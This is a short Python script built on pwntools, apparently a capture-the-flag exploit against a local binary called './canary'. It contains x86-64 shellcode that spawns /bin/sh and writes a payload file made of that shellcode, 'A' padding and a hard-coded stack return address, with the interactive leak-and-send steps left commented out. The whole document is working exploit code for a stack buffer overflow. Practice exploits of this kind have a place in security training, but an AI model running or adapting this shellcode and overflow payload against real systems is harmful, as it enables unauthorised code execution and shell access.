from pwn import *

p = process('./canary')

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
# p.sendline(shellcode)
# p.sendline(b'123')
# p.recvuntil(b'address: ')
# leak = p.recvline()
# leak = int(leak[2:-1].decode(), 16)

# p.recvuntil(b'number: \n')


# offset = -45

# print(len(shellcode))
# payload = b'123\n123\n' + shellcode[1:] + p64(leak + offset)

with open('payload', 'wb') as fp:
	fp.write(shellcode + b'\n')
	fp.write(b'123\n')
	leak = 0x7fffffffdd41
	fp.write(b'A' * 20 + p64(leak + 12) + b'\n')

# payload = b'A' * 20 + p64(leak - 12)
# p.sendline(payload)

# p.interactive()

# p.close()

